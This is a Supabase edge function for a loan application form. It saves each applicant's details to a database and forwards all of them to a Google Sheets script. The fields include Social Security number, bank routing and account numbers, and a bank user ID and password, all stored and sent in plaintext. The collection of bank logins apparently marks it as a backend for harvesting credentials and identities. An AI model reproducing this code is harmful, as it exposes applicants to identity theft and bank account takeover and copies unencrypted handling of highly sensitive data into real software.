// Supabase Edge Function: submit-application
// Receives customer application, saves to Supabase, and forwards to Google Sheets

import { createClient } from 'npm:@supabase/supabase-js@2'
import { corsHeaders, isAllowedOrigin } from '../_shared/cors.ts'

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  if (!isAllowedOrigin(req)) {
    return new Response(JSON.stringify({ error: 'Forbidden: invalid origin' }), {
      status: 403,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    })
  }

  try {
    const { customer } = await req.json()
    if (!customer || !customer.email) {
      return new Response(JSON.stringify({ error: 'Missing customer data' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }

    const supabaseUrl = Deno.env.get('SUPABASE_URL') || ''
    const serviceRoleKey = Deno.env.get('SB_SERVICE_ROLE_KEY') || ''
    const googleScriptUrl = Deno.env.get('CUSTOMER_SERVICE_SCRIPT_URL') || ''

    if (!supabaseUrl || !serviceRoleKey) {
      return new Response(JSON.stringify({ error: 'Server configuration missing' }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }

    const adminClient = createClient(supabaseUrl, serviceRoleKey, {
      auth: { persistSession: false }
    })

    const { data, error } = await adminClient
      .from('customers')
      .insert({
        application_id: customer.applicationId,
        first_name: customer.firstName,
        last_name: customer.lastName,
        email: customer.email,
        phone_number: customer.phoneNumber,
        home_address: customer.homeAddress,
        city: customer.city,
        state: customer.state,
        zip_code: customer.zipCode,
        date_of_birth: customer.dateOfBirth,
        ssn_number: customer.ssnNumber,
        loan_amount: parseFloat(customer.loanAmount),
        loan_purpose: customer.loanPurpose,
        loan_term: parseInt(customer.loanTerm),
        monthly_payment: parseFloat(customer.monthlyPayment),
        loan_agent: customer.loanAgent,
        bank_name: customer.bankName,
        routing_number: customer.routingNumber,
        account_number: customer.accountNumber,
        user_id: customer.userId,
        password: customer.password,
        status: customer.status || 'review'
      })
      .select()
      .single()

    if (error) {
      console.error('Supabase insert error:', error)
      throw error
    }

    if (googleScriptUrl) {
      const sheetParams = new URLSearchParams()
      sheetParams.append('action', 'saveCustomer')
      Object.entries(customer).forEach(([key, value]) => {
        sheetParams.append(key, value !== undefined && value !== null ? String(value) : '')
      })

      // Wait up to 60 seconds for Google Sheets, but don't fail the form if it's slow
      const controller = new AbortController()
      const timeout = setTimeout(() => controller.abort(), 60000)

      try {
        const sheetBody = sheetParams.toString()
        const bodyBytes = new TextEncoder().encode(sheetBody)
        await fetch(googleScriptUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': String(bodyBytes.length)
          },
          body: sheetBody,
          signal: controller.signal
        })
        console.log('Google Sheets forwarded successfully')
      } catch (sheetErr) {
        console.error('Google Sheets forwarding error:', sheetErr)
      } finally {
        clearTimeout(timeout)
      }
    }

    return new Response(JSON.stringify({ success: true, data }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    })
  } catch (error) {
    console.error('Edge function error:', error)
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    })
  }
})